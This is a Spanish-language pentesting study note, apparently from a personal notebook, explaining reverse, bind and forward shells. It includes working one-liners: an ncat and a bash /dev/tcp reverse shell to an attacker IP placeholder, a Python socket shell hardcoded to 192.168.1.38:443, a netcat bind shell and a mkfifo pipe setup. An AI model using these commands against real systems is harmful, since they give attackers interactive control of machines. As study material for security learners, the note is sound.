-----------
- Tags: #explotación #basico #teoria
---

# Reverse Shell

Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, premitiéndole tomar el control de la máquina remota. 

En el ejemplo de la imagen, supongamos que la maquina victima tiene expuesto un puerto :80, con un servicio de apache2, el cual, es vulnerable a **RCE** (Remote Code Execution), una vez pudiendo ejecutar comandos como la maquina victima, al atacante le interesaria enviarse una consola interactiva por un puerto que el decida.

![[reverseShell.png|1000]]

Algunos oneliners típicos para lograr esto son:

- #### Haciendo uso de net cat:
```shell
ncat -e /bin/bash {IP_atacante} {puerto}
```

- #### Haciendo uso de bash:
```shell
bash -i >& /dev/tcp/{IP_atacante}/{puerto} 0>&1 
```

- #### Haciendo uso de python: 
```python 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.38",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

#### Más oneliners [aca](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

---

# Bind Shell 

Esta técnica es el opuesto de la **Reverse Shell**, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante por ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma. 

En este caso, en el ejemplo de la imagen, el atacante al explotar el **RCE**, inyecta un comando malicioso, en este ejemplo `nc -nlvp 443 -e /bin/bash` que lo que hace es escuchar en el puerto 443 por conexiones, y cuando reciba una, otorgara la consola interactiva.

![[BindShell.png|1000]]

-----------

# Forward Shell 

Esta técnica es utiliza cuando no se pueden estrablecer conexiones **Reverse** o **Bind** debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO (named pipe)**, que se utiliza como una espcie de **consola simulada** interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

## Ejemplo: 

#### Si ejecutaramos el sig comando...

```shell
mkfifo input; tail -f input | /bin/bash; 2>&1 > output 
```

#### ...veriamos que se creo un archivo **FIFO** llamado input y un archivo normal llamada output, la idea de esto es que ahora, haciendo uso de descriptores, podriamos redirigir las entradas a input y ver las salidas de estas en output.

```shell
echo "Este comando se va a alojar en output" > input 
cat output 
# ───────┬─────────────────────────────────────────────────
#        │ File: output
# ───────┼─────────────────────────────────────────────────
#    1   │ Este comando se va a alojar en output
# ───────┴─────────────────────────────────────────────────
```

 